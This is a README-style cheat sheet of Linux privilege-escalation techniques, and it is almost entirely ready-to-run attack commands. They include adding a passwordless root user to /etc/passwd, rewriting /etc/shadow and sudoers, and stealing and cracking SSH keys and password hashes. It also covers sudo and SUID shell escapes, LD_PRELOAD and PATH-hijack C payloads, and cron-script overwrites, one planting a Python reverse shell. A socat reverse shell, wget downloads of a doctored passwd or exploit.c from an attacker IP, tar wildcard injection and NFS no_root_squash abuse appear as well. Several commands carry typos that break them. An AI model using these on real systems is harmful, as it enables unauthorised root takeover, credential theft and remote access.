# Linux-Privilege-Escalation-Basics
Simple and accurate guide for linux privilege escalation tactics 

# Privilege Escalation Methods

- Basic System Enumeration
- Bash History
- OpenVPN Credentials
- Writable Files
- SSH Private Keys 
- Kernel Expliots
- Sudo -l 
- Sudo CVE 
- Sudo LD_PRELOAD
- SUID / GUID Binaries
- SUID PATH Environmental Variable
- Cron Tabs & Scheduled Tasks
- Capabilities
- NFS Root Squashing
- Tmux
- chkrootkit 0.49


# Basic System Enumeration
Structure : Linux Command // <Comment / Tip>
```
uname -a 
hostname 
lscpu 
ls /home 
ls /var/www/html 
ls /var/www/
ps aux | grep root 
netstat -tulpn 
ps -aux | grep root | grep mysql
ifconfig 
find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \;
locate pass | more
```
# Bash History
Structure : Linux Command // <Comment / Tip>
```
history                            
cat /home/<user>/.bash_history     
cat ~/.bash_history | grep -i passw 
```

# OpenVPN Credentials
Structure : Linux Command // <Comment / Tip>
```
locate *.ovpn                       
```

# Writable Password Files
If you have write permission to the following files:

- /etc/passwd
- /etc/shadow
- /etc/sudoers

Structure : Linux Command // <Comment / Tip>

/etc/passwd
```
   echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
   su - hacker
   id && whoami
   
OR
   
  vi /etc/passwd
  Remote X (Password Holder) for root
  wg!
  su root
  id && whoami
  
OR

  echo root::0:0:root:/root:/bin/bash > /etc/passwd
  id && whomai
  
```  
/etc/shadow 
```  

   Run python -c "import crypt; print crypt.crypt('NewRootPassword')"
   Copy the output
   vi /etc/shadow
   Replace root's hash with the output that you generated
   wq!
   su root 
   id && whoami
   
```    
/etc/sudoers
```    
   echo "<username> ALL=(ALL:ALL) ALL" >> /etc/sudoers // Replace "Username" with your current user (Example: www-data)
   sudo su
   id && whoami

   ```
# SSH Private Keys 

Structure : Linux Command / <Comment / Tip>

```
find / -name authorized_keys 2> /dev/null              // Any Public Keys?
find / -name id_rsa 2> /dev/null                       // Any SSH private keys? 

   Copy id_rsa contents of keys found with the above command
   Create a local file on your box and paste the content in
   chmod 600 <local_file>
   ssh -i <local_file> user@IP
   
   // Is the key password protected?

   ssh2john <local_file> > hash
   john hash --wordlist=/usr/share/wordlists/rockyou.txt
   
```

# Kernel Expliots

Structure : Linux Command // <Comment / Tip>
```
uname -a // What OS kernel are we using?

// Google Search (Example): 4.4.0-116-generic #140-Ubuntu Expliots OR 4.4.0-116-generic #140-Ubuntu PoC github
// Read the expliots and follow the instructions
// Popular Linux Kernel Exploits

Dirty COW (CVE-2016-5195)
URL: https://dirtycow.ninja/

Other Kernel Expliots
URL: https://github.com/SecWiki/linux-kernel-exploits

```

# Sudo -l

Sudo -l 

What binaries can we execute with Sudo?

Example Output

User www-data may run the following commands on <hostname>

- (root) NOPASSWD: /usr/bin/find
- (root) NOPASSWD: /usr/bin/nmap
- (root) NOPASSWD: /usr/bin/env
- (root) NOPASSWD: /usr/bin/vim
- (root) NOPASSWD: /usr/bin/awk
- (root) NOPASSWD: /usr/bin/perl
- (root) NOPASSWD: /usr/bin/python
- (root) NOPASSWD: /usr/bin/less
- (root) NOPASSWD: /usr/bin/man
- (root) NOPASSWD: /usr/bin/ftp
- (root) NOPASSWD: /usr/bin/socat
- (root) NOPASSWD: /usr/bin/zip
- (root) NOPASSWD: /usr/bin/gcc
- (root) NOPASSWD: /usr/bin/docker
- (root) NOPASSWD: /usr/bin/env
- (root) NOPASSWD: /usr/bin/MySQL
- (root) NOPASSWD: /usr/bin/ssh
- (root) NOPASSWD: /usr/bin/tmux
- (root) NOPASSWD: /usr/bin/pkexec
- (root) NOPASSWD: /usr/bin/rlwrap
- (root) NOPASSWD: /usr/bin/xargs
- (root) NOPASSWD: /usr/bin/anansi_util
- (root) NOPASSWD: /usr/bin/wget




Absuing Sudo binaries to gain root
----------------------------------------------------
find
```
sudo find / etc/passwd -exec /bin/bash \;
```

Nmap
```
echo "os.execute('/bin/bash/')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```

Env
```
sudo env /bin/bash
```

Vim
```
sudo vim -c ':!/bin/bash'
```

Awk
```
sudo awk 'BEGIN {system("/bin/bash")}'
```

Perl
```
sudo perl -e 'exec "/bin/bash";'
```

Python
```
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```

Less
```
sudo less /etc/hosts - !bash
```

Man
```
sudo man man - !bash
```

ftp
```
sudo ftp - ! /bin/bash
```

socat
```
Attacker = socat file:`tty`,raw,echo=0 tcp-listen:1234
Victim = sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
```

Zip
```
echo test > notes.txt
sudo zip test.zip notes.txt -T --unzip-command="sh -c /bin/bash"
```

gcc
```
sudo gcc -wrapper /bin/bash,-s .
```

Docker
```
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

MySQL
```
sudo mysql -e '\! /bin/sh'
```

SSH
```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

Tmux
```
Sudo tmux
```

pkexec
```
sudo pkexec /bin/bash
```

rlwrap
```
sudo rlwrap /bin/bash
```

xargs
```
sudo xargs -a /dev/null sh
```

anansi_util
```
sudo /home/anansi/bin/anansi_util manual /bin/bash  
```

Wget

Victim
```
cp /etc/passwd /tmp/passwd
cat /etc/passwd

```
Attacker

```
Copy /etc/passwd content and put in a local file called passwd
Run python -c "import crypt; print crypt.crypt('NewRootPassword')"
Copy output of the above command 
edit passwd
Replace x in root's line with the copied output
Save the file
python -m SimpleHTTPServer 9000 // You can use any port
```

Victim

```
sudo wget http://<attacker_ip>:9000/passwd -O /etc/passwd
su root // Enter the new root password you generated (Example: NewRootPassword)
id && whoami
```


# Sudo CVE
Expliot sudo with known CVE

CVE:

- CVE-2019-14287
- CVE-2019-16634

CVE-2019-14287

sudo -V // Get sudo version
sudo -l

Vulnerable output 
Output = (ALL,!root) NOPASSWD: /bin/bash 

```   
    sudo -u#-1 /bin/bash
    id && whoami
    
```

CVE-2019-16634

sudo -V // Get sudo version

sudo su root // If you type root's password , can you see the *****? // That means pw_feedback is enabled

Expliot PoC: https://github.com/saleemrashid/sudo-cve-2019-18634

Download expliot.c
Upload to Victim 

Attacker
```
python -m SimpleHTTPServer 9000 // You can use any port

```

Victim

```
wget http://<attacker_ip>:9000/expliot.c
Compile expliot.c: gcc expliot.c -o expliot
./expliot
id && whoami 
```

# Sudo LD_PRELOAD

Structure : Linux Command // <Comment / Tip>

sudo -l 

Example Output: env_reset, env_keep+=LD_PRELOAD // Do you have the same output with sudo binary rights?

Expliot

```

cd /tmp
vi priv.c
   
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

Compile priv.c: gcc -fPIC -shared -o priv.so priv.c -nostartfiles
Command: sudo LD_PRELOAD=/tmp/priv.so awk // awk can be replaced with any sudo binary
```

# SUID / GUID Binaries Overview
Structure : Linux Command // <Comment / Tip>

SUID: Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Those files which have suid permissions run with higher privileges.  Assume we are accessing the target system as a non-root user and we found suid bit enabled binaries, then those file/program/command can run with root privileges. 

Basically, you can change the permission of any file either using the “Numerical” method or “Symbolic” method. As result, it will replace x from s as shown in the below image which denotes especial execution permission with the higher privilege to a particular file/command. Since we are enabling SUID for Owner (user) therefore bit 4 or symbol s will be added before read/write/execution operation.
Basic Enumeration

GUID permission is similar to the SUID permission, only difference is – when the script or command with SGID on is run, it runs as if it were a member of the same group in which the file is a member

Enumeration:

```
find / -perm -u=s -type f 2>/dev/null 
find / -perm -g=s -type f 2>/dev/null 
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null 

// Look for any binaries that seem odd. Any binaries running from a users home directory?
// Check the version of any odd binaries and see if there are any public expliots that can be used to gain root

```

# SUID PATH Environmental Variable

PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored. When the user run any command on the terminal, its request to the shell to search for executable files with the help of PATH Variable in response to commands executed by a user. The superuser also usually has /sbin and /usr/sbin entries for easily executing system administration commands.

View PATH

```
echo $PATH
env | grep PATH
print $PATH
```
Example 1

Create a Simple Basic SUID binary

```
cd /home/max/
vi test.c

#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("ps");

  }


```
Compile Binary & Add SUID Bit

```
gcc test.c -o test
chmod u+s test
```

Privilege Escalation

```
Find the SUID Binary

find / -perm -u=s -type f 2>/dev/null OR find / -uid 0 -perm -4000 -type f 2>/dev/null 
Output Example: /home/max/test
ls -la /home/max/test 

Absue the SUID Binary

echo "/bin/bash" > /tmp/ps
chmod 777 /tmp/ps
echo $PATH
export PATH=/tmp:$PATH
/home/max/test
id && whoami
```
Example 2

Privilege Escalation

```
Find the SUID Binary

find / -perm -u=s -type f 2>/dev/null OR find / -uid 0 -perm -4000 -type f 2>/dev/null 
Output Example: /bin/tools/network-testerv1
ls -la /bin/tools/network-testerv1

Test the SUID Binary 

/bin/tools/network-testerv1
strings /bin/tools/network-testerv1
Output Example: curl -I http://localhost 

Absue the SUID Binary

echo "/bin/bash" > /tmp/curl
chmod 777 /tmp/curl
echo $PATH
export PATH=/tmp:$PATH
/bin/tools/network-testerv1
id && whoami
```

Example 3

Privilege Escalation

```
Find the SUID Binary

find / -perm -u=s -type f 2>/dev/null OR find / -uid 0 -perm -4000 -type f 2>/dev/null 
Output Example: /bin/tools/webserver-status
ls -la /bin/tools/webserver-status

Test the SUID Binary 

/bin/tools/webserver-status
strings /bin/tools/webserver-status
Output Example: service apache2 status

Absue the SUID Binary

echo 'int mian() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
chmod 777 /tmp/service
export PATH=/tmp:$PATH
echo $PATH
/bin/tools/webserver-status
id && whoami
```

Example 4

Privilege Escalation

```
Find the SUID Binary

find / -perm -u=s -type f 2>/dev/null OR find / -uid 0 -perm -4000 -type f 2>/dev/null 
Output Example: /bin/tools/webserver-status
ls -la /bin/tools/webserver-status

Test the SUID Binary 

/bin/tools/webserver-status
strings /bin/tools/webserver-status
Output Example: /usr/sbin/service apache2 status

Absue the SUID Binary

fucntion /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
/bin/tools/webserver-status
id && whoami
```
# Cron Tabs & Scheduled Tasks

Cron jobs is a time-based job scheduler in Unix-like computer operating systems. Users that set up and maintain software environments use cron to schedule jobs to run periodically at fixed times, dates, or intervals

Enumeration

```
contab -l
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
```
Example 1

Privilege Escalation via Nonexistent File Overwrite

```
cat /etc/crontab
Output Example: * * * * * root systemupdate.sh
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/systemupdate.sh
chmod +x /home/user/systemupdate.sh
Wait a while
/tmp/bash -p
id && whoami

OR

cat /etc/crontab
Output Example: * * * * * root systemupdate.sh
echo "#!/bin/bash" > /home/user/systemupdate.sh
echo "chmod +s /bin/bash" >> /home/user/systemupdate.sh
chmod +x  /home/user/systemupdate.sh
Wait a while
/bin/bash -p
id && whoami
```

Example 2

Privilege Escalation via Root Executable Bash Script

```
cat /etc/crontab
Output Example: * * * * * root /usr/bin/local/network-test.sh
echo "chmod +s /bin/bash" >> /usr/bin/local/network-test.sh
Wait a while
id && whomai
```

Example 3

Privilege Escalation via Root Executable Python Script Overwrite

Target

```
cat /etc/crontab
Output Example: * * * * * root /var/www/html/web-backup.py
cd /var/www/html/
vi web-backup.py
Add the below to the script:

import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.10.10",443)); 
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);'

// Replace the IP & Port 

// Save & Exit the Script
```
Attacker

```
nc -lvnp 443
```

OR

Target

```
cat /etc/crontab
Output Example: * * * * * root /var/www/html/web-backup.py
cd /var/www/html/
vi web-backup.py
Add the below to the script:

import os

os.system("chmod +s /bin/bash")

// Save & Exit the Script

Wait a While
/bin/bash -p
id && whoami
```

Example 4

Privilege Escalation via Tar Bash Script (WildCards)

```
cat /etc/crontab
Output Example: * * * * * root /usr/bin/local/mysql-db-backup.sh
cat /usr/bin/local/mysql-db-backup.sh
Output of Script:
--------------------------------
#!/bin/bash

cd /var/www/html/
tar czf /tmp/dbbackup.tar.gz *
--------------------------------
cd /var /www/html/
echo "#!/bin/bash" > priv.sh
echo "chmod +s /bin/bash" >> priv.sh
chmod +x priv.sh
touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint-action=exec=sh\ priv.sh
Wait a while
/bin/bash -p
id && whomai
```

# Capabilities

Linux capabilities are special attributes in the Linux kernel that grant processes and binary executables specific privileges that are normally reserved for processes whose effective user ID is 0 (The root user, and only the root user, has UID 0).

Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks.

Essentially, the goal of capabilities is to divide the power of 'root' into specific privileges, so that if a process or binary that has one or more capability is exploited, the potential damage is limited when compared to the same process running as root.

Capabilities can be set on processes and executable files. A process resulting from the execution of a file can gain the capabilities of that file.

- Python
- Perl
- Tar

Python

```
getcap -r / 2>/dev/null         
/usr/bin/python2.6 = cap_setuid+ep
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id && whoami

OR

getcap -r / 2>/dev/null  
/usr/bin/python3 = cap_setuid+ep
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id && whoami
```

Perl

```
getcap -r / 2>/dev/null         
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
id && whoami
```

Tar

```
Victim

getcap -r / 2>/dev/null         
/usr/bin/tar = cap dac read search+ep
/usr/bin/tar -cvf shadow.tar /etc/shadow
/usr/bin/tar -xvf shadow.tar
cat etc/passwd
Copy content of users accounts to a local file called shadow

Attacker

john shadow --wordlist=/usr/share/wordlists/rockyou.txt
Crack root's credentials

Victim

su root
id && whoami
```

# NFS Root Squashing

Network File System (NFS): Network File System permits a user on a client machine to mount the shared files or directories over a network. NFS uses Remote Procedure Calls (RPC) to route requests between clients and servers. Although NFS uses TCP/UDP port 2049 for sharing any files/directories over a network.

- rw: Permit clients to read as well as write access to the shared directory.

- ro: Permit clients to Read-only access to shared directory.

- root_squash: This option Prevents file request made by user root on the client machine because NFS shares change the root user to the nfsnobody user, which is an unprivileged user account.

- no_root_squash: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implication.

- async: It will speed up transfers but can cause data corruption as NFS server doesn’t wait for the complete write operation to be finished on the stable storage, before replying to the client.

- sync:   The sync option does the inverse of async option where the NFS server will reply to the client only after the data is finally written to the stable storage.

Enumeration

```
Victim


cat /etc/exports             // Do we see any no_root_squash enabled on a mounted share?

/tmp *(rw,sync,insecure,no_root_squash,no,subtree,check) 

Attacker

nmap -sV --script=nfs-showmount <victim_ip> 

```
Privilege Escalation

Attacker

```

showmount -e <victim_ip>                      
mkdir /tmp/mount                                
mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount  
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mount/priv.c  
gcc /tmp/mount/priv.c -o /tmp/mount/priv
chmod +s /tmp/mount/priv

OR

showmount -e <victim_ip>   
mkdir /tmp/mount 
mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount  
cd /tmp/mount
cp /bin/bash .
chmod +s bash
```
```
Victim

cd /tmp
./priv
id && whoami

OR

cd /tmp
./bash -p
id && whoami
```

# chkrootkit 0.49

```
Expliot: https://www.exploit-db.com/exploits/33899

cat /etc/cron.daily

/usr/bin/chkrootkit
ls -la /usr/bin/chkrootkit     // Do we have SUID?
chkrootkit -V
echo "#!/bin/bash" > /tmp/update
echo "chmod +s /bin/bash" >> /tmp/update
Wait a While ...
/bin/bash -p
id && whoami
```

# Tmux

tmux is a terminal multiplexer for Unix-like operating systems.

It allows multiple terminal sessions to be accessed simultaneously in a single window.

It is useful for running more than one command-line program at the same time.

Tmux Cheat Sheet: https://tmuxcheatsheet.com/

Privilege Escalation

```
tmux list-sessions                        // Any Tmux sessions running as root?
/tmp/tmux-14/default-root                 // Root Tmux Session
tmux -S /tmp/tmux-14/default-root         // Replace Path to Socket (Depending on your results)

OR

tmux list-sessions                        // Any Tmux sessions running as root?
/tmp/tmux-14/default-root                 // Root Tmux Session
tmux -S /opt/.dev/gbm/ attach -t 0        // Replace Path to Session (Depending on your results)
```
